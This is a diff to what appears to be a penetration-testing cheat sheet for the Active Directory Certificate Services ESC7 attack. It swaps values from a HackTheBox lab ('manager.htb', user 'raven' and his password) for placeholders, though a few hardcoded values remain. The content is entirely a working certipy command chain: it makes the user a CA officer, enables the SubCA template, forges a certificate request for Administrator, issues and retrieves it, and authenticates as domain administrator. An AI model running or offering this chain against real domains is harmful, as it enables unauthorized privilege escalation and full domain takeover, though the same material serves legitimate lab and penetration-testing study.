@@ -224,17 +224,23 @@ certreq -q -accept cert.pem
 
 ESC7
 ---
+#esc7
+
 ```sh
-certipy find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.145.165 -vulnerable -stdout -text
+certipy find -u $USER -p PASSWORD -dc-ip $TARGET_IP -vulnerable -stdout -text
 
 #ESC7
-certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+certipy ca -ca $AD_CA -add-officer $USER -username $USER@$AD_DOMAIN -password $PASSWORD
 
-certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+certipy ca -ca $AD_CA -enable-template SubCA -username $USER@$AD_DOMAIN -password $PASSWORD
 
-certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn Administrator@manager.htb -debug
+certipy req -username $USER@$AD_DOMAIN -password $PASSWORD -ca $AD_CA  -target manager.htb -template SubCA -upn Administrator@$AD_DOMAIN -debug
 
-certipy ca -ca 'manager-DC01-CA' -issue-request 23 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+certipy ca -ca $AD_CA -issue-request XX -username $USER@$AD_DOMAIN -password $PASSWORD
 
-certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 23
+certipy req -username raven@manager.htb -password $PASSWORD -ca $AD_CA -target $AD_DOMAIN -retrieve XX
+
+#fix clock skew then:
+sudo ntpdate -s $AD_DOMAIN
+certipy auth -pfx administrator.pfx -dc-ip $TARGET_IP
 ```
